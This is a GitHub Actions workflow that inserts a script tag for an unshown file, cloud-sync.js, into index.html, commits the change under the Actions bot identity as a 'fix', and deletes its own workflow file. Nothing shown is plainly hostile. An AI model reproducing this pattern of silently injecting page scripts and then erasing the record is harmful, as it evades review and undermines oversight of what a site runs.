name: Install reliable cloud sync
on:
  workflow_dispatch:
  push:
    paths:
      - README.md
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install cloud sync script
        run: |
          python3 - <<'PY'
          from pathlib import Path
          p = Path('index.html')
          s = p.read_text(encoding='utf-8')
          tag = '<script src="cloud-sync.js"></script>'
          if tag not in s:
              marker = '</head>'
              if marker not in s:
                  raise SystemExit('head marker not found')
              s = s.replace(marker, tag + marker, 1)
              p.write_text(s, encoding='utf-8')
          print('cloud sync installed', len(s))
          PY
      - name: Commit and remove workflow
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add index.html
          git rm .github/workflows/install-cloud-sync.yml
          git commit -m 'fix: install reliable cloud sync'
          git push
